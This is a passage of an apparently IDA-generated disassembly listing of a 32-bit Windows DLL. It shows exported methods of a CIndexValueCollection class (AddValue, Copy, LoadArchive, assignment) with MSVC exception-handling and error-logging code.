		mov	ecx, esi
		mov	[ebp+var_4], ebx
		call	Ordinal180
		test	al, al
		jnz	short loc_6AF34789
		push	offset aCindexvalue_16 ; "CIndexValueCollection::AddValue(VARIANT"...
		call	sub_6AF3102E

loc_6AF34786:				; CODE XREF: Ordinal174+5Aj
		pop	ecx
		jmp	short loc_6AF347B4
; ---------------------------------------------------------------------------

loc_6AF34789:				; CODE XREF: Ordinal174+2Bj
		push	[ebp+pvargSrc]	; pvargSrc
		mov	esi, [ebp+var_4]
		lea	eax, [esi+18h]
		push	eax		; pvarDest
		call	ds:VariantCopyInd
		cmp	eax, ebx
		jge	short loc_6AF347AB
		push	eax		; Args
		push	offset aCindexvalue_17 ; "CIndexValueCollection::AddValue(VARIANT"...
		call	sub_6AF3102E
		pop	ecx
		jmp	short loc_6AF34786
; ---------------------------------------------------------------------------

loc_6AF347AB:				; CODE XREF: Ordinal174+4Cj
		mov	dword ptr [esi+8], 0Bh
		mov	bl, 1

loc_6AF347B4:				; CODE XREF: Ordinal174+38j
		lea	ecx, [ebp+var_10]
		call	Ordinal1230
		pop	esi
		mov	al, bl
		pop	ebx
		leave
		retn	4
Ordinal174	endp

; Exported entry 175.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal175
Ordinal175	proc near		; DATA XREF: .rdata:off_6AF66098o

var_10		= byte ptr -10h
var_4		= dword	ptr -4
arg_0		= dword	ptr  8

		push	ebp
		mov	ebp, esp
		sub	esp, 10h
		push	ebx
		push	esi
		mov	esi, ecx
		xor	ebx, ebx
		push	ebx
		push	0FFFFFFFFh
		lea	eax, [esi+58h]
		push	eax
		lea	ecx, [ebp+var_10]
		call	Ordinal1228
		lea	eax, [ebp+var_4]
		push	eax
		mov	ecx, esi
		mov	[ebp+var_4], ebx
		call	Ordinal180
		test	al, al
		jnz	short loc_6AF347FE
		push	offset aCindexvalue_18 ; "CIndexValueCollection::AddValue(ISymBas"...
		call	sub_6AF3102E
		pop	ecx
		jmp	short loc_6AF34815
; ---------------------------------------------------------------------------

loc_6AF347FE:				; CODE XREF: Ordinal175+2Bj
		mov	esi, [ebp+var_4]
		push	[ebp+arg_0]
		lea	ecx, [esi+40h]
		call	sub_6AF334D7
		mov	dword ptr [esi+8], 0Ch
		mov	bl, 1

loc_6AF34815:				; CODE XREF: Ordinal175+38j
		lea	ecx, [ebp+var_10]
		call	Ordinal1230
		pop	esi
		mov	al, bl
		pop	ebx
		leave
		retn	4
Ordinal175	endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_6AF34825	proc near		; CODE XREF: Ordinal159+4Dp

var_10		= byte ptr -10h
var_8		= dword	ptr -8
var_4		= dword	ptr -4
arg_0		= dword	ptr  8

		push	ebp
		mov	ebp, esp
		sub	esp, 10h
		push	esi
		push	edi
		mov	edi, [ebp+arg_0]
		mov	esi, ecx
		cmp	esi, edi
		jz	loc_6AF348BC
		mov	ecx, [edi+10h]
		test	ecx, ecx
		jnz	short loc_6AF3484A
		mov	ecx, esi
		call	sub_6AF33B0C
		jmp	short loc_6AF348BC
; ---------------------------------------------------------------------------

loc_6AF3484A:				; CODE XREF: sub_6AF34825+1Aj
		mov	edx, [esi+10h]
		cmp	ecx, edx
		mov	eax, [edi+0Ch]
		ja	short loc_6AF34886
		mov	edx, [esi+0Ch]
		push	edx
		push	esi
		add	ecx, eax
		push	ecx
		push	edi
		push	eax
		lea	eax, [ebp+var_8]
		push	edi
		push	eax
		call	sub_6AF338C3
		mov	eax, [esi+10h]
		add	eax, [esi+0Ch]
		add	esp, 1Ch
		push	eax
		push	esi
		push	[ebp+var_4]
		lea	eax, [ebp+var_8]
		push	[ebp+var_8]
		mov	ecx, esi
		push	eax
		call	sub_6AF33968
		jmp	short loc_6AF348BC
; ---------------------------------------------------------------------------

loc_6AF34886:				; CODE XREF: sub_6AF34825+2Dj
		push	ebx
		push	dword ptr [esi+0Ch]
		mov	ebx, eax
		push	esi
		add	ebx, edx
		push	ebx
		push	edi
		push	eax
		lea	eax, [ebp+var_10]
		push	edi
		push	eax
		mov	[ebp+var_8], edi
		call	sub_6AF338C3
		mov	eax, [edi+10h]
		add	eax, [edi+0Ch]
		mov	ecx, [esi+10h]
		add	ecx, [esi+0Ch]
		add	esp, 1Ch
		push	eax
		push	edi
		push	ebx
		push	edi
		push	ecx
		push	esi
		mov	ecx, esi
		call	sub_6AF343D8
		pop	ebx

loc_6AF348BC:				; CODE XREF: sub_6AF34825+Fj
					; sub_6AF34825+23j ...
		pop	edi
		mov	eax, esi
		pop	esi
		leave
		retn	4
sub_6AF34825	endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_6AF348C4	proc near		; CODE XREF: Ordinal163+A9p
					; Ordinal178+B2p

var_4		= dword	ptr -4
arg_0		= dword	ptr  8

		push	ebp
		mov	ebp, esp
		push	ecx
		push	esi
		sub	esp, 48h
		mov	esi, ecx
		mov	ecx, esp
		mov	[ebp+var_4], esp
		call	Ordinal245
		push	[ebp+arg_0]
		mov	ecx, esi
		call	sub_6AF34310
		pop	esi
		leave
		retn	4
sub_6AF348C4	endp


; =============== S U B	R O U T	I N E =======================================


; int __stdcall	sub_6AF348E7(wchar_t *Src)
sub_6AF348E7	proc near		; CODE XREF: Ordinal173+6Dp
					; Ordinal286+70p

Src		= dword	ptr  4

		push	esi
		mov	esi, [esp+4+Src]
		test	esi, esi
		push	edi
		mov	edi, ecx
		jnz	short loc_6AF348F7
		xor	eax, eax
		jmp	short loc_6AF348FF
; ---------------------------------------------------------------------------

loc_6AF348F7:				; CODE XREF: sub_6AF348E7+Aj
		push	esi		; Str
		call	ds:wcslen
		pop	ecx

loc_6AF348FF:				; CODE XREF: sub_6AF348E7+Ej
		push	eax		; int
		push	esi		; Src
		mov	ecx, edi
		call	sub_6AF3436F
		pop	edi
		pop	esi
		retn	4
sub_6AF348E7	endp


; =============== S U B	R O U T	I N E =======================================


; int __thiscall sub_6AF3490D(void *, char)
sub_6AF3490D	proc near		; DATA XREF: .rdata:off_6AF54D14o

arg_0		= byte ptr  4

		push	esi
		mov	esi, ecx
		call	Ordinal157
		test	[esp+4+arg_0], 1
		jz	short loc_6AF34923
		push	esi		; void *
		call	??3@YAXPAX@Z	; operator delete(void *)
		pop	ecx

loc_6AF34923:				; CODE XREF: sub_6AF3490D+Dj
		mov	eax, esi
		pop	esi
		retn	4
sub_6AF3490D	endp

; Exported entry 159.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal159
Ordinal159	proc near		; CODE XREF: Ordinal158+25p
					; DATA XREF: .rdata:off_6AF66098o

var_50		= dword	ptr -50h
var_4C		= dword	ptr -4Ch
var_48		= byte ptr -48h
var_28		= dword	ptr -28h
Src		= byte ptr -24h
var_14		= dword	ptr -14h
var_10		= dword	ptr -10h
var_C		= dword	ptr -0Ch
var_4		= dword	ptr -4
arg_0		= dword	ptr  8

		mov	eax, offset unknown_libname_34 ; Microsoft VisualC 2-10/net runtime
		call	__EH_prolog
		sub	esp, 44h
		mov	eax, ___security_cookie
		push	ebx
		push	esi
		push	edi
		mov	edi, [ebp+arg_0]
		mov	esi, ecx
		cmp	esi, edi
		mov	[ebp+var_14], eax
		mov	[ebp+var_10], esp
		mov	[ebp+var_28], esi
		jz	loc_6AF34A23
		push	edi
		call	Ordinal259
		push	offset aCindexvalue_19 ; "CIndexValueCollection::operator =()"
		lea	ecx, [ebp+var_48]
		call	Ordinal751
		and	[ebp+var_4], 0
		add	edi, 78h
		push	edi
		lea	ecx, [esi+78h]
		mov	byte ptr [ebp+var_4], 1
		call	sub_6AF34825
		jmp	loc_6AF34A1B
; ---------------------------------------------------------------------------

loc_6AF34980:				; DATA XREF: .rdata:6AF62310o
		push	13h
		lea	ecx, [ebp+var_48]
		call	Ordinal649
		push	offset aStdBad_alloc ; "std::bad_alloc"
		lea	ecx, [ebp+var_48]
		call	Ordinal762
		mov	ecx, [ebp+var_50]
		mov	eax, [ecx]
		call	dword ptr [eax+4]
		push	eax		; Src
		lea	ecx, [ebp+var_48]
		call	Ordinal764
		lea	ecx, [ebp+var_48]
		call	Ordinal767
		push	eax		; Args
		push	offset aCccatchS ; "CCCATCH : %s\n"
		call	sub_6AF3102E
		pop	ecx
		pop	ecx
		mov	eax, offset loc_6AF34A18
		retn
; ---------------------------------------------------------------------------

loc_6AF349C3:				; DATA XREF: .rdata:6AF62320o
		push	15h
		lea	ecx, [ebp+var_48]
		call	Ordinal649
		push	offset aCatlexception ;	"CAtlException"
		lea	ecx, [ebp+var_48]
		call	Ordinal762
		mov	eax, [ebp+var_4C]
		push	dword ptr [eax]
		lea	eax, [ebp+Src]
		push	offset a0x08x	; "0x%08X"
		push	eax		; LPSTR
		call	ds:wsprintfA
		add	esp, 0Ch
		lea	eax, [ebp+Src]
		push	eax		; Src
		lea	ecx, [ebp+var_48]
		call	Ordinal764
		lea	ecx, [ebp+var_48]
		call	Ordinal767
		push	eax		; Args
		push	offset aCccatchS ; "CCCATCH : %s\n"
		call	sub_6AF3102E
		pop	ecx
		pop	ecx
		mov	eax, offset loc_6AF34A18
		retn
; ---------------------------------------------------------------------------

loc_6AF34A18:				; DATA XREF: Ordinal159+94o
					; Ordinal159+E9o
		mov	esi, [ebp+var_28]

loc_6AF34A1B:				; CODE XREF: Ordinal159+52j
		lea	ecx, [ebp+var_48]
		call	Ordinal752

loc_6AF34A23:				; CODE XREF: Ordinal159+25j
		mov	ecx, [ebp+var_C]
		mov	large fs:0, ecx
		mov	ecx, [ebp+var_14]
		mov	eax, esi
		call	unknown_libname_15 ; Microsoft VisualC 2-10/net	runtime
		pop	edi
		pop	esi
		pop	ebx
		leave
		retn	4
Ordinal159	endp ; sp-analysis failed

; Exported entry 163.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal163
Ordinal163	proc near		; DATA XREF: .rdata:off_6AF66098o

var_70		= byte ptr -70h
var_64		= dword	ptr -64h
var_60		= dword	ptr -60h
var_5C		= byte ptr -5Ch
var_3C		= dword	ptr -3Ch
var_38		= dword	ptr -38h
var_34		= dword	ptr -34h
var_30		= dword	ptr -30h
var_2C		= dword	ptr -2Ch
var_28		= dword	ptr -28h
Src		= byte ptr -24h
var_14		= dword	ptr -14h
var_10		= dword	ptr -10h
var_C		= dword	ptr -0Ch
var_4		= dword	ptr -4
Args		= byte ptr  8

		mov	eax, offset unknown_libname_35 ; Microsoft VisualC 2-10/net runtime
		call	__EH_prolog
		sub	esp, 64h
		mov	eax, ___security_cookie
		push	ebx
		push	esi
		push	edi
		mov	[ebp+var_10], esp
		mov	esi, ecx
		xor	ebx, ebx
		push	ebx
		mov	[ebp+var_14], eax
		push	0FFFFFFFFh
		lea	eax, [esi+58h]
		push	eax
		lea	ecx, [ebp+var_70]
		mov	[ebp+var_3C], esi
		call	Ordinal1228
		mov	ecx, esi
		mov	[ebp+var_4], ebx
		call	Ordinal162
		mov	edi, dword ptr [ebp+Args]
		push	edi
		lea	ecx, [ebp+var_28]
		mov	[ebp+var_28], ebx
		call	sub_6AF334FE
		cmp	[ebp+var_28], ebx
		mov	byte ptr [ebp+var_4], 1
		jnz	short loc_6AF34AB7
		push	offset aCindexvalue_20 ; "CIndexValueCollection::Copy()	: pIndexV"...

loc_6AF34A96:				; CODE XREF: Ordinal163+90j
		call	sub_6AF3102E
		pop	ecx

loc_6AF34A9C:				; CODE XREF: Ordinal163+247j
		mov	ecx, [ebp+var_28]
		cmp	ecx, ebx
		mov	byte ptr [ebp+var_4], bl
		jz	loc_6AF34C3A
		mov	eax, [ecx]
		call	dword ptr [eax+8]
		mov	[ebp+var_28], ebx
		jmp	loc_6AF34C3A
; ---------------------------------------------------------------------------

loc_6AF34AB7:				; CODE XREF: Ordinal163+51j
		mov	eax, [edi]
		lea	ecx, [ebp+var_2C]
		push	ecx
		mov	ecx, edi
		mov	[ebp+var_2C], ebx
		call	dword ptr [eax+0Ch]
		test	al, al
		jnz	short loc_6AF34AD0
		push	offset aCindexvalue_21 ; "CIndexValueCollection::Copy()	: pValueC"...
		jmp	short loc_6AF34A96
; ---------------------------------------------------------------------------

loc_6AF34AD0:				; CODE XREF: Ordinal163+89j
		push	offset aCindexvalue_22 ; "CIndexValueCollection::Copy()"
		lea	ecx, [ebp+var_5C]
		call	Ordinal751
		push	[ebp+var_2C]
		lea	ecx, [esi+78h]
		mov	byte ptr [ebp+var_4], 3
		call	sub_6AF348C4
		jmp	loc_6AF34B91
; ---------------------------------------------------------------------------

loc_6AF34AF1:				; DATA XREF: .rdata:6AF62388o
		push	13h
		lea	ecx, [ebp+var_5C]
		call	Ordinal649
		push	offset aStdBad_alloc ; "std::bad_alloc"
		lea	ecx, [ebp+var_5C]
		call	Ordinal762
		mov	ecx, [ebp+var_64]
		mov	eax, [ecx]
		call	dword ptr [eax+4]
		push	eax		; Src
		lea	ecx, [ebp+var_5C]
		call	Ordinal764
		lea	ecx, [ebp+var_5C]
		call	Ordinal767
		push	eax		; Args
		push	offset aCccatchS ; "CCCATCH : %s\n"
		call	sub_6AF3102E
		pop	ecx
		pop	ecx
		mov	eax, offset loc_6AF34B89
		retn
; ---------------------------------------------------------------------------

loc_6AF34B34:				; DATA XREF: .rdata:6AF62398o
		push	15h
		lea	ecx, [ebp+var_5C]
		call	Ordinal649
		push	offset aCatlexception ;	"CAtlException"
		lea	ecx, [ebp+var_5C]
		call	Ordinal762
		mov	eax, [ebp+var_60]
		push	dword ptr [eax]
		lea	eax, [ebp+Src]
		push	offset a0x08x	; "0x%08X"
		push	eax		; LPSTR
		call	ds:wsprintfA
		add	esp, 0Ch
		lea	eax, [ebp+Src]
		push	eax		; Src
		lea	ecx, [ebp+var_5C]
		call	Ordinal764
		lea	ecx, [ebp+var_5C]
		call	Ordinal767
		push	eax		; Args
		push	offset aCccatchS ; "CCCATCH : %s\n"
		call	sub_6AF3102E
		pop	ecx
		pop	ecx
		mov	eax, offset loc_6AF34B89
		retn
; ---------------------------------------------------------------------------

loc_6AF34B89:				; DATA XREF: Ordinal163+F0o
					; Ordinal163+145o
		mov	esi, [ebp+var_3C]
		mov	edi, dword ptr [ebp+Args]
		xor	ebx, ebx

loc_6AF34B91:				; CODE XREF: Ordinal163+AEj
		lea	ecx, [ebp+var_5C]
		mov	[ebp+var_4], 2
		call	Ordinal753
		test	eax, eax
		jnz	loc_6AF34C7D
		cmp	[ebp+var_2C], ebx
		mov	[ebp+var_38], ebx
		mov	[ebp+var_34], ebx
		mov	[ebp+var_30], ebx
		mov	dword ptr [ebp+Args], ebx
		jbe	short loc_6AF34C1A

loc_6AF34BB9:				; CODE XREF: Ordinal163+1DAj
		mov	eax, [edi]
		lea	ecx, [ebp+var_38]
		push	ecx
		push	dword ptr [ebp+Args] ; Args
		mov	ecx, edi
		call	dword ptr [eax+14h]
		test	al, al
		jz	loc_6AF34C6B
		mov	eax, [edi]
		lea	ecx, [ebp+var_34]
		push	ecx
		push	dword ptr [ebp+Args]
		mov	ecx, edi
		call	dword ptr [eax+10h]
		test	al, al
		jz	loc_6AF34C6B
		mov	eax, [esi]
		lea	ecx, [ebp+var_30]
		push	ecx
		push	dword ptr [ebp+Args]
		mov	ecx, esi
		call	dword ptr [eax+0Ch]
		test	al, al
		jz	short loc_6AF34C5D
		push	[ebp+var_30]
		mov	ecx, esi
		push	[ebp+var_38]
		push	[ebp+var_34]
		push	dword ptr [ebp+Args]
		push	edi
		call	Ordinal301
		test	al, al
		jz	short loc_6AF34C64
		inc	dword ptr [ebp+Args]
		mov	eax, dword ptr [ebp+Args]
		cmp	eax, [ebp+var_2C]
		jb	short loc_6AF34BB9

loc_6AF34C1A:				; CODE XREF: Ordinal163+179j
		lea	ecx, [ebp+var_5C]
		mov	byte ptr [esi+8], 1
		call	Ordinal752
		mov	ecx, [ebp+var_28]
		cmp	ecx, ebx
		mov	byte ptr [ebp+var_4], bl
		jz	short loc_6AF34C38
		mov	eax, [ecx]
		call	dword ptr [eax+8]
		mov	[ebp+var_28], ebx

loc_6AF34C38:				; CODE XREF: Ordinal163+1F0j
		mov	bl, 1

loc_6AF34C3A:				; CODE XREF: Ordinal163+66j
					; Ordinal163+74j
		lea	ecx, [ebp+var_70]
		call	Ordinal1230
		mov	ecx, [ebp+var_C]
		mov	large fs:0, ecx
		mov	ecx, [ebp+var_14]
		mov	al, bl
		call	unknown_libname_15 ; Microsoft VisualC 2-10/net	runtime
		pop	edi
		pop	esi
		pop	ebx
		leave
		retn	4
; ---------------------------------------------------------------------------

loc_6AF34C5D:				; CODE XREF: Ordinal163+1B7j
		push	offset aCindexvalue_23 ; "CIndexValueCollection::Copy()	: GetWrit"...
		jmp	short loc_6AF34C70
; ---------------------------------------------------------------------------

loc_6AF34C64:				; CODE XREF: Ordinal163+1CFj
		push	offset aCindexvalue_24 ; "CIndexValueCollection::Copy()	: CopyVal"...
		jmp	short loc_6AF34C70
; ---------------------------------------------------------------------------

loc_6AF34C6B:				; CODE XREF: Ordinal163+18Bj
					; Ordinal163+1A1j
		push	offset aCindexvalue_25 ; "CIndexValueCollection::Copy()	: pValueC"...

loc_6AF34C70:				; CODE XREF: Ordinal163+224j
					; Ordinal163+22Bj
		call	sub_6AF3102E
		pop	ecx
		mov	ecx, esi
		call	Ordinal162

loc_6AF34C7D:				; CODE XREF: Ordinal163+164j
		lea	ecx, [ebp+var_5C]
		call	Ordinal752
		jmp	loc_6AF34A9C
Ordinal163	endp ; sp-analysis failed

; Exported entry 178.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal178
Ordinal178	proc near		; DATA XREF: .rdata:6AF54D24o
					; .rdata:off_6AF66098o

var_64		= dword	ptr -64h
var_60		= dword	ptr -60h
var_5C		= byte ptr -5Ch
var_3C		= dword	ptr -3Ch
var_38		= dword	ptr -38h
var_34		= dword	ptr -34h
var_30		= dword	ptr -30h
var_2C		= dword	ptr -2Ch
var_25		= byte ptr -25h
Src		= byte ptr -24h
var_14		= dword	ptr -14h
var_10		= dword	ptr -10h
var_C		= dword	ptr -0Ch
var_4		= dword	ptr -4
arg_0		= dword	ptr  8

		mov	eax, offset unknown_libname_36 ; Microsoft VisualC 2-10/net runtime
		call	__EH_prolog
		sub	esp, 58h
		mov	eax, ___security_cookie
		push	ebx
		push	esi
		push	edi
		mov	edi, ecx
		mov	[ebp+var_14], eax
		mov	[ebp+var_10], esp
		mov	[ebp+var_3C], edi
		call	Ordinal162
		push	[ebp+arg_0]
		mov	ecx, edi
		call	Ordinal296
		test	al, al
		jnz	short loc_6AF34CC4
		push	offset aCindexvalue_26 ; "CIndexValueCollection::LoadArchive() : "...
		jmp	short loc_6AF34CDE
; ---------------------------------------------------------------------------

loc_6AF34CC4:				; CODE XREF: Ordinal178+31j
		mov	ecx, [ebp+arg_0]
		lea	eax, [ebp+var_38]
		xor	ebx, ebx
		push	eax
		mov	[ebp+var_38], ebx
		call	Ordinal329
		test	eax, eax
		jnz	short loc_6AF34CEB
		push	offset aCindexvalue_27 ; "CIndexValueCollection::LoadArchive() : "...

loc_6AF34CDE:				; CODE XREF: Ordinal178+38j
		call	sub_6AF3102E
		pop	ecx
		xor	al, al
		jmp	loc_6AF34E7A
; ---------------------------------------------------------------------------

loc_6AF34CEB:				; CODE XREF: Ordinal178+4Dj
		mov	eax, [ebp+var_38]
		dec	eax
		mov	[ebp+var_25], 1
		jz	short loc_6AF34CFC
		push	offset aCindexvalue_28 ; "CIndexValueCollection::LoadArchive() : "...
		jmp	short loc_6AF34D14
; ---------------------------------------------------------------------------

loc_6AF34CFC:				; CODE XREF: Ordinal178+69j
		mov	ecx, [ebp+arg_0]
		lea	eax, [ebp+var_2C]
		push	eax
		mov	[ebp+var_2C], ebx
		call	Ordinal323
		test	eax, eax
		jnz	short loc_6AF34D22
		push	offset aCindexvalue_27 ; "CIndexValueCollection::LoadArchive() : "...

loc_6AF34D14:				; CODE XREF: Ordinal178+70j
		call	sub_6AF3102E
		pop	ecx
		mov	[ebp+var_25], bl
		jmp	loc_6AF34E70
; ---------------------------------------------------------------------------

loc_6AF34D22:				; CODE XREF: Ordinal178+83j
		push	offset aCindexvalue_29 ; "CIndexValueCollection::LoadArchive()"
		lea	ecx, [ebp+var_5C]
		call	Ordinal751
		push	[ebp+var_2C]
		mov	[ebp+var_4], ebx
		lea	ecx, [edi+78h]
		mov	byte ptr [ebp+var_4], 1
		call	sub_6AF348C4
		jmp	loc_6AF34DE3
; ---------------------------------------------------------------------------

loc_6AF34D46:				; DATA XREF: .rdata:6AF623F0o
		push	13h
		lea	ecx, [ebp+var_5C]
		call	Ordinal649
		push	offset aStdBad_alloc ; "std::bad_alloc"
		lea	ecx, [ebp+var_5C]
		call	Ordinal762
		mov	ecx, [ebp+var_60]
		mov	eax, [ecx]
		call	dword ptr [eax+4]
		push	eax		; Src
		lea	ecx, [ebp+var_5C]
		call	Ordinal764
		lea	ecx, [ebp+var_5C]
		call	Ordinal767
		push	eax		; Args
		push	offset aCccatchS ; "CCCATCH : %s\n"
		call	sub_6AF3102E
		pop	ecx
		pop	ecx
		mov	eax, offset loc_6AF34DDE
		retn
; ---------------------------------------------------------------------------

loc_6AF34D89:				; DATA XREF: .rdata:6AF62400o
		push	15h
		lea	ecx, [ebp+var_5C]
		call	Ordinal649
		push	offset aCatlexception ;	"CAtlException"
		lea	ecx, [ebp+var_5C]
		call	Ordinal762
		mov	eax, [ebp+var_64]
		push	dword ptr [eax]
		lea	eax, [ebp+Src]
		push	offset a0x08x	; "0x%08X"
		push	eax		; LPSTR
		call	ds:wsprintfA
		add	esp, 0Ch
		lea	eax, [ebp+Src]
		push	eax		; Src
		lea	ecx, [ebp+var_5C]
		call	Ordinal764
		lea	ecx, [ebp+var_5C]
		call	Ordinal767
		push	eax		; Args
		push	offset aCccatchS ; "CCCATCH : %s\n"
		call	sub_6AF3102E
		pop	ecx
		pop	ecx
		mov	eax, offset loc_6AF34DDE
		retn
; ---------------------------------------------------------------------------

loc_6AF34DDE:				; DATA XREF: Ordinal178+F9o
					; Ordinal178+14Eo
		mov	edi, [ebp+var_3C]
		xor	ebx, ebx

loc_6AF34DE3:				; CODE XREF: Ordinal178+B7j
		lea	ecx, [ebp+var_5C]
		mov	[ebp+var_4], ebx
		call	Ordinal753
		test	eax, eax
		jz	short loc_6AF34DFF
		lea	ecx, [ebp+var_5C]
		mov	[ebp+var_25], bl
		call	Ordinal752
		jmp	short loc_6AF34E70
; ---------------------------------------------------------------------------

loc_6AF34DFF:				; CODE XREF: Ordinal178+166j
		xor	esi, esi
		cmp	[ebp+var_2C], ebx
		mov	[ebp+var_34], ebx
		mov	[ebp+var_30], ebx
		jbe	short loc_6AF34E63

loc_6AF34E0C:				; CODE XREF: Ordinal178+1B9j
		mov	ecx, [ebp+arg_0]
		lea	eax, [ebp+var_34]
		push	eax
		call	Ordinal323
		test	eax, eax
		jz	short loc_6AF34E47
		mov	eax, [edi]
		lea	ecx, [ebp+var_30]
		push	ecx
		push	[ebp+var_34]
		mov	ecx, edi
		call	dword ptr [eax+0Ch]
		test	al, al
		jz	short loc_6AF34E4E
		push	[ebp+var_30]
		mov	ecx, edi
		push	[ebp+arg_0]
		call	Ordinal299
		test	al, al
		jz	short loc_6AF34E55
		inc	esi
		cmp	esi, [ebp+var_2C]
		jb	short loc_6AF34E0C
		jmp	short loc_6AF34E63
; ---------------------------------------------------------------------------

loc_6AF34E47:				; CODE XREF: Ordinal178+190j
		push	offset aCindexvalue_27 ; "CIndexValueCollection::LoadArchive() : "...
		jmp	short loc_6AF34E5A
; ---------------------------------------------------------------------------

loc_6AF34E4E:				; CODE XREF: Ordinal178+1A2j
		push	offset aCindexvalue_30 ; "CIndexValueCollection::LoadArchive() : "...
		jmp	short loc_6AF34E5A
; ---------------------------------------------------------------------------

loc_6AF34E55:				; CODE XREF: Ordinal178+1B3j
		push	offset aCindexvalue_31 ; "CIndexValueCollection::LoadArchive() : "...

loc_6AF34E5A:				; CODE XREF: Ordinal178+1C2j
					; Ordinal178+1C9j
		call	sub_6AF3102E
		pop	ecx
		mov	[ebp+var_25], bl

loc_6AF34E63:				; CODE XREF: Ordinal178+180j
					; Ordinal178+1BBj
		lea	ecx, [ebp+var_5C]
		call	Ordinal752
		cmp	[ebp+var_25], bl
		jnz	short loc_6AF34E77

loc_6AF34E70:				; CODE XREF: Ordinal178+93j
					; Ordinal178+173j
		mov	ecx, edi
		call	Ordinal162

loc_6AF34E77:				; CODE XREF: Ordinal178+1E4j
		mov	al, [ebp+var_25]

loc_6AF34E7A:				; CODE XREF: Ordinal178+5Cj
		mov	ecx, [ebp+var_C]
		mov	large fs:0, ecx
		mov	ecx, [ebp+var_14]
		call	unknown_libname_15 ; Microsoft VisualC 2-10/net	runtime
		pop	edi
		pop	esi
		pop	ebx
		leave
		retn	4
Ordinal178	endp ; sp-analysis failed

; Exported entry 158.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal158
Ordinal158	proc near		; DATA XREF: .rdata:off_6AF66098o

arg_0		= dword	ptr  4

		push	esi
		mov	esi, ecx
		call	Ordinal256
		push	[esp+4+arg_0]
		xor	ecx, ecx
		lea	eax, [esi+78h]
		mov	dword ptr [esi], offset	off_6AF54D14
		mov	[eax+4], ecx
		mov	[eax+8], ecx
		mov	[eax+0Ch], ecx
		mov	[eax+10h], ecx
		mov	ecx, esi
		call	Ordinal159
		mov	eax, esi
		pop	esi
		retn	4
Ordinal158	endp

; Exported entry 172.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __stdcall	Ordinal172(char	*Src)
		public Ordinal172
Ordinal172	proc near		; DATA XREF: .rdata:off_6AF66098o

var_5C		= byte ptr -5Ch
var_50		= dword	ptr -50h
var_4C		= dword	ptr -4Ch
var_48		= byte ptr -48h
Args		= byte ptr -28h
var_24		= byte ptr -24h
var_14		= dword	ptr -14h
var_10		= dword	ptr -10h
var_C		= dword	ptr -0Ch
var_4		= dword	ptr -4
Src		= dword	ptr  8

		mov	eax, offset unknown_libname_37 ; Microsoft VisualC 2-10/net runtime
		call	__EH_prolog
		sub	esp, 50h
		mov	eax, ___security_cookie
		push	ebx
		push	esi
		push	edi
		mov	[ebp+var_10], esp
		mov	esi, ecx
		xor	ebx, ebx
		push	ebx
		mov	[ebp+var_14], eax
		push	0FFFFFFFFh
		lea	eax, [esi+58h]
		push	eax
		lea	ecx, [ebp+var_5C]
		call	Ordinal1228
		lea	eax, [ebp+Args]
		push	eax		; Args
		mov	ecx, esi
		mov	[ebp+var_4], ebx
		mov	dword ptr [ebp+Args], ebx
		call	Ordinal180
		test	al, al
		jnz	short loc_6AF34F16
		push	offset aCindexvalue_32 ; "CIndexValueCollection::AddValue(LPCSTR)"...
		call	sub_6AF3102E
		pop	ecx
		jmp	loc_6AF34FF8
; ---------------------------------------------------------------------------

loc_6AF34F16:				; CODE XREF: Ordinal172+41j
		push	offset aCindexvalue_33 ; "CIndexValueCollection::AddValue(LPCSTR)"...
		lea	ecx, [ebp+var_48]
		call	Ordinal751
		mov	ecx, dword ptr [ebp+Args]
		push	[ebp+Src]	; Src
		add	ecx, 38h
		mov	byte ptr [ebp+var_4], 2
		call	sub_6AF31B1D

loc_6AF34F35:				; DATA XREF: Ordinal172+C6o
					; Ordinal172+11Bo
		lea	ecx, [ebp+var_48]
		call	Ordinal753
		test	eax, eax
		jz	loc_6AF34FE4
		xor	bl, bl
		jmp	loc_6AF34FF0
; ---------------------------------------------------------------------------

loc_6AF34F4C:				; DATA XREF: .rdata:6AF62460o
		push	13h
		lea	ecx, [ebp+var_48]
		call	Ordinal649
		push	offset aStdBad_alloc ; "std::bad_alloc"
		lea	ecx, [ebp+var_48]
		call	Ordinal762
		mov	ecx, [ebp+var_50]
		mov	eax, [ecx]
		call	dword ptr [eax+4]
		push	eax		; Src
		lea	ecx, [ebp+var_48]
		call	Ordinal764
		lea	ecx, [ebp+var_48]
		call	Ordinal767
		push	eax		; Args
		push	offset aCccatchS ; "CCCATCH : %s\n"
		call	sub_6AF3102E
		pop	ecx
		pop	ecx
		mov	eax, offset loc_6AF34F35
		retn
; ---------------------------------------------------------------------------

loc_6AF34F8F:				; DATA XREF: .rdata:6AF62470o
		push	15h
		lea	ecx, [ebp+var_48]
		call	Ordinal649
		push	offset aCatlexception ;	"CAtlException"
		lea	ecx, [ebp+var_48]
		call	Ordinal762
		mov	eax, [ebp+var_4C]
		push	dword ptr [eax]
		lea	eax, [ebp+var_24]
		push	offset a0x08x	; "0x%08X"
		push	eax		; LPSTR
		call	ds:wsprintfA
		add	esp, 0Ch
		lea	eax, [ebp+var_24]
		push	eax		; Src
		lea	ecx, [ebp+var_48]
		call	Ordinal764
		lea	ecx, [ebp+var_48]
		call	Ordinal767
		push	eax		; Args
		push	offset aCccatchS ; "CCCATCH : %s\n"
		call	sub_6AF3102E
		pop	ecx
		pop	ecx
		mov	eax, offset loc_6AF34F35
		retn
; ---------------------------------------------------------------------------

loc_6AF34FE4:				; CODE XREF: Ordinal172+7Cj
		mov	eax, dword ptr [ebp+Args]
		mov	dword ptr [eax+8], 7
		mov	bl, 1

loc_6AF34FF0:				; CODE XREF: Ordinal172+84j
		lea	ecx, [ebp+var_48]
		call	Ordinal752

loc_6AF34FF8:				; CODE XREF: Ordinal172+4Ej
		lea	ecx, [ebp+var_5C]
		call	Ordinal1230
		mov	ecx, [ebp+var_C]
		mov	large fs:0, ecx
		mov	ecx, [ebp+var_14]
		mov	al, bl
		call	unknown_libname_15 ; Microsoft VisualC 2-10/net	runtime
		pop	edi
		pop	esi
		pop	ebx
		leave
		retn	4
Ordinal172	endp ; sp-analysis failed

; Exported entry 173.

